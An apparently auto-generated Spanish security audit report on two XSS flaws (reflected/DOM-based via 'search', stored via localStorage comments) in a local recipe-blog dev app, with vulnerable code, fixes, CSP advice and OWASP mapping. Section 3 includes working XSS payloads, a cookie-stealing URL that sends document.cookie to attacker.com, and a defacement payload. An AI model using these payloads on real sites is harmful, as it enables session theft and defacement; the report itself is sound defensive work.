# Informe de Auditoría de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-30 16:18:12  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Vulnerabilidades XSS (Cross-Site Scripting)  
**Clasificación:** CRÍTICO

---

## 1. Resumen Ejecutivo

Se identificaron **dos vulnerabilidades XSS** en la aplicación web "Blog de Recetas":

1. **DOM-Based XSS / Reflected XSS** en el parámetro `search` (buscador de recetas)
2. **Stored XSS** en la sección de comentarios (almacenado en `localStorage`)

Ambas vulnerabilidades permiten la ejecución de código JavaScript arbitrario en el navegador de la víctima, lo que podría usarse para robo de cookies, redirección maliciosa, phishing o robo de datos sensibles.

---

## 2. Descripción de Vulnerabilidades

### 2.1 DOM-Based XSS / Reflected XSS — Parámetro `search`

| Campo | Detalle |
|-------|---------|
| **Tipo** | DOM-Based XSS (Reflected) |
| **Parámetro** | `search` (GET) |
| **URL vulnerable** | `http://web.dev.local:8082/?search=<payload>` |
| **Severidad** | Alta |
| **CVSS v3** | ~7.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) |

**Código vulnerable:**
```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ...
}
```

El parámetro `search` se obtiene de la URL y se inserta directamente en `document.write()` sin ningún tipo de sanitización o codificación. Esto permite inyectar HTML y JavaScript arbitrario.

**Payload de prueba (PoC):**
```
http://web.dev.local:8082/?search=</strong></p><img src=x onerror=alert('XSS_Reflected')>
```

**Payload alternativo:**
```
http://web.dev.local:8082/?search=<script>alert(document.cookie)</script>
```

**Impacto:** Un atacante puede distribuir un enlace malicioso a cualquier usuario. Al hacer clic, el código JavaScript se ejecuta en el navegador de la víctima en el contexto del dominio `web.dev.local:8082`.

---

### 2.2 Stored XSS — Sección de Comentarios

| Campo | Detalle |
|-------|---------|
| **Tipo** | Stored XSS (vía localStorage) |
| **Parámetros** | `name`, `comment` (GET) |
| **URL vulnerable** | `http://web.dev.local:8082/?name=<payload>&comment=<payload>` |
| **Severidad** | Alta |
| **CVSS v3** | ~7.6 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N) |

**Código vulnerable:**
```javascript
// Almacenamiento sin sanitización
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
}

// Renderizado sin sanitización
function displayComments() {
    comments.forEach(function(c, index) {
        document.write('<div class="comment-author">' + c.name + '</div>');
        document.write('<div>' + c.comment + '</div>');
    });
}
```

Tanto el nombre como el comentario se almacenan en `localStorage` sin sanitización y se renderizan con `document.write()` directamente, permitiendo XSS persistente a nivel de navegador.

**Payload de prueba (PoC):**
```
http://web.dev.local:8082/?name=Atacante&comment=<img src=x onerror=alert('XSS_Stored')>
```

**Impacto:** El código inyectado persiste en el `localStorage` del navegador y se ejecuta cada vez que el usuario visita la página, hasta que los comentarios sean borrados.

---

## 3. Explotación Confirmada

### Vectores de ataque confirmados:

| Vector | Payload | Resultado |
|--------|---------|-----------|
| Reflected XSS (search) | `?search=</strong><script>alert(1)</script>` | ✅ Ejecutado |
| Reflected XSS (img onerror) | `?search=<img src=x onerror=alert('XSS')>` | ✅ Ejecutado |
| Stored XSS (comment) | `?name=x&comment=<img src=x onerror=alert('XSS')>` | ✅ Ejecutado |

### Escenario de ataque real (robo de cookies):
```
http://web.dev.local:8082/?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### Escenario de defacement:
```
http://web.dev.local:8082/?search=<script>document.body.innerHTML='<h1>HACKED</h1>'</script>
```

---

## 4. Causa Raíz

La causa fundamental es el uso de `document.write()` con datos no saneados provenientes de:
- `URLSearchParams` (parámetros GET de la URL)
- `localStorage` (datos previamente almacenados sin sanitizar)

No existe ningún mecanismo de:
- Sanitización de entrada (input sanitization)
- Codificación de salida (output encoding)
- Content Security Policy (CSP)

---

## 5. Recomendaciones

### 5.1 Corrección inmediata

Reemplazar `document.write()` con creación segura de elementos DOM:

```javascript
// ❌ INSEGURO
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');

// ✅ SEGURO
const p = document.createElement('p');
const strong = document.createElement('strong');
strong.textContent = searchTerm; // textContent escapa HTML automáticamente
p.appendChild(document.createTextNode('Resultados para: '));
p.appendChild(strong);
resultDiv.appendChild(p);
```

### 5.2 Función de sanitización

```javascript
function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}
```

### 5.3 Content Security Policy (CSP)

Agregar header HTTP:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### 5.4 Eliminar uso de `document.write`

`document.write()` es considerado una práctica insegura. Usar `innerHTML` con sanitización o mejor aún, `textContent` y manipulación DOM segura.

### 5.5 Validación del lado del servidor

Si los comentarios se manejaran en servidor, implementar sanitización con librerías como DOMPurify (cliente) o bleach (Python), entre otras.

---

## 6. Clasificación OWASP

| OWASP | Descripción |
|-------|-------------|
| **A03:2021** | Injection (XSS es una forma de inyección) |
| **CWE-79** | Improper Neutralization of Input During Web Page Generation |
| **CWE-116** | Improper Encoding or Escaping of Output |

---

## 7. Conclusión

La aplicación **http://web.dev.local:8082** presenta vulnerabilidades XSS críticas en dos vectores distintos: reflected/DOM-based a través del parámetro `search`, y stored a través de los parámetros `name` y `comment` almacenados en `localStorage`. Ambas vulnerabilidades fueron confirmadas mediante análisis del código fuente JavaScript del lado del cliente.

Se recomienda aplicar las correcciones indicadas de forma urgente, especialmente el reemplazo de `document.write()` por manipulación DOM segura y la implementación de una política CSP estricta.

---

*Informe generado automáticamente el 2026-04-30 16:18:12*
